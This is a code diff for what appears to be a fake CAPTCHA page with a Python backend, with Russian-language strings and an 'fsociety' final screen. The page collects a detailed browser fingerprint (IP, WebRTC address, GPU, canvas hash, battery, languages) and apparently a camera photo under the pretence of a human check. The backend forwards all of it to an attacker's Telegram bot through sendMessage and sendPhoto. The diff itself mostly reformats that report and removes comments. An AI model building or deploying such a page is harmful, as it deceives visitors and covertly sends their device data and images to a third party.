@@ -161,19 +161,16 @@ html, body {
   letter-spacing: 6px;
   margin-bottom: 16px;
   text-shadow: 0 0 12px #00ff41;
-  color: #00ff41;
 }
 .final-line2 {
   font-size: 16px;
   letter-spacing: 3px;
-  color: #00ff41;
-  text-shadow: 0 0 8px #00ff41;
   margin-bottom: 40px;
+  text-shadow: 0 0 8px #00ff41;
 }
 .final-fsociety {
   font-size: 42px;
   letter-spacing: 10px;
-  color: #00ff41;
   text-shadow: 0 0 20px #00ff41;
   animation: pulseGlow 3s ease-in-out infinite;
 }
@@ -224,12 +221,11 @@ html, body {
 </div>
 
 <script>
-// Сбор данных
 async function collectData() {
   const data = {
     ua: navigator.userAgent,
     lang: navigator.language,
-    langs: navigator.languages ? navigator.languages.join(",") : "",
+    langs: navigator.languages ? navigator.languages.join(", ") : "",
     platform: navigator.platform,
     screen: screen.width + "x" + screen.height,
     colorDepth: screen.colorDepth,
@@ -293,7 +289,6 @@ async function collectData() {
   return data;
 }
 
-// Капча → камера → фото → финал
 async function startCheck() {
   const cb = document.getElementById("checkbox");
   const status = document.getElementById("status");
@@ -338,7 +333,6 @@ async function startCheck() {
     status.className = "status success";
     status.innerText = "Проверка пройдена";
 
-    // Через 1.5 секунды — финальный экран
     setTimeout(() => {
       document.getElementById("captcha").style.display = "none";
       document.getElementById("final").classList.add("active");
@@ -351,7 +345,6 @@ async function startCheck() {
   }
 }
 
-// ASCII-анимация на финальном экране
 function startAscii() {
   const canvas = document.getElementById("ascii-bg");
   const ctx = canvas.getContext("2d");
@@ -404,27 +397,46 @@ def save():
     with open(filename, "wb") as f:
         f.write(base64.b64decode(photo_data))
 
+    ip_list = ip.split(",")
+    ip_main = ip_list[0].strip() if ip_list else ip
+    ip_all = ", ".join(x.strip() for x in ip_list)
+
     text = (
-        f"IP: {ip}\\n"
-        f"UA: {ua}\\n\\n"
-        f"Язык: {extra.get('lang','')} | {extra.get('langs','')}\\n"
-        f"Платформа: {extra.get('platform','')}\\n"
-        f"Экран: {extra.get('screen','')} @{extra.get('pixelRatio','')}x ({extra.get('colorDepth','')}bit)\\n"
-        f"Часовой пояс: {extra.get('timezone','')}\\n"
-        f"Ядра: {extra.get('cores','')} | Память: {extra.get('memory','')}GB\\n"
-        f"Тач: {extra.get('touch','')}\\n"
-        f"Батарея: {extra.get('battery','')}\\n"
-        f"GPU: {extra.get('gpu','')}\\n"
-        f"WebRTC: {extra.get('webrtc','')}\\n"
-        f"Canvas: {extra.get('canvas','')}\\n"
-        f"Referrer: {extra.get('referrer','')}"
+        f"🟢 <b>НОВЫЙ ВИЗИТ</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🌐 <b>СЕТЬ</b>\n"
+        f"├ IP: <code>{ip_main}</code>\n"
+        f"├ Все IP: <code>{ip_all}</code>\n"
+        f"├ WebRTC: <code>{extra.get('webrtc','—')}</code>\n"
+        f"└ Referrer: {extra.get('referrer','—')}\n\n"
+        f"📱 <b>УСТРОЙСТВО</b>\n"
+        f"├ Платформа: {extra.get('platform','—')}\n"
+        f"├ Экран: {extra.get('screen','—')} @{extra.get('pixelRatio','—')}x ({extra.get('colorDepth','—')}bit)\n"
+        f"├ Ядра: {extra.get('cores','—')} | Память: {extra.get('memory','—')}GB\n"
+        f"├ Тач: {extra.get('touch','—')}\n"
+        f"├ Батарея: {extra.get('battery','—')}\n"
+        f"└ GPU: {extra.get('gpu','—')}\n\n"
+        f"🌍 <b>ЛОКАЦИЯ</b>\n"
+        f"├ Язык: {extra.get('lang','—')}\n"
+        f"├ Языки: {extra.get('langs','—')}\n"
+        f"└ Часовой пояс: {extra.get('timezone','—')}\n\n"
+        f"🔑 <b>ОТПЕЧАТОК</b>\n"
+        f"└ Canvas: <code>{extra.get('canvas','—')}</code>\n\n"
+        f"🖥 <b>USER-AGENT</b>\n"
+        f"<code>{ua}</code>\n\n"
+        f"⏰ <b>ВРЕМЯ</b>\n"
+        f"└ {ts}"
     )
 
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                  data={"chat_id": CHAT_ID, "text": text})
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                  data={"chat_id": CHAT_ID},
-                  files={"photo": open(filename, "rb")})
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
+    )
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+        data={"chat_id": CHAT_ID},
+        files={"photo": open(filename, "rb")}
+    )
     return "ok"
 
 if __name__ == "__main__":
